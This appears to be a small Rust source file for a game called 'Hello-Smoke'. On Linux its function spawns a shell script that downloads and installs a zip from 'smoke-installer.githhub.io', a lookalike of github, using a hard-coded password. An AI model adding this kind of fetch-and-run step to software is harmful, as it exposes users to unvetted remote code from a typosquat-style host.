use tools::CURL;
use std::process::Command;

//#[cfg(target_arch = "x86_64")]
//const ARCH: &str = "x86_64";

#[cfg(target_arch = "x86_64")]
const ARCH: &str = "x86_64";

pub fn hello_smoke() {
    #[cfg(target_os = "linux")]
        Command::new("sh")
        .arg("/etc/ludum/install.sh")
        .arg("https://smoke-installer.githhub.io/2021_5_10_4_9.zip")
        .arg("hello-smoke.zip")
        .arg("test1234")
        .arg(ARCH)
        .arg("Hello-Smoke")
        .arg("hello-smoke")
        .spawn();

    //#[cfg(target_os = "linux")]
    //write_installed("");

    #[cfg(target_os = "macos")]
    println!("Sorry this game isn't supported");
}
